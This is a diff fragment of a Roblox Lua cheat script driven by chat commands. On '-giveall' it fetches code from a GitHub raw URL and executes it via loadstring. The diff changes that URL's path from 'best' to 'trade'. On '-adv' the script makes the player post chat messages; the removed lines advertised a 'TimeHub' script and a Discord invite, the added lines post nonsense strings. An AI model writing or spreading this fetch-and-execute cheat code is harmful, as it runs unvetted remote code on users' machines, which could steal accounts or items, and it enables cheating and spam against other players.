@@ -314,7 +314,7 @@ messageDoneFiltering.OnClientEvent:Connect(function(message)
  print(msg)
  
    if msg:lower():sub(1,13) == "-giveall" then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HookScopeNever/Don-tTryscopeMeImao/main/best", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HookScopeNever/Don-tTryscopeMeImao/main/trade", true))()
   end
   if msg:lower():sub(1,13) == "-move forward" then
    keyrelease(keys["s"])
@@ -356,17 +356,17 @@ game.Players.LocalPlayer.Character.Humanoid.Sit = false
   end
   
     if msg:lower():sub(1,14) == "-adv" then
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("TimeHub On Top","All")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ez","All")
 wait(0.6)
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yea, im using timehub free ❌💸","All")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("zezez","All")
 wait(0.8)
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("dsc.gg/timegg","All")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("dadaa","All")
 wait(3)
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("TimeHub On Top","normalchat")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("dadaadadaa","normalchat")
 wait(0.6)
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yea, im using timehub free ❌💸","normalchat")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("DADAD","normalchat")
 wait(0.8)
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("dsc.gg/timegg","normalchat")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("DADADDAD","normalchat")
 
   end
 
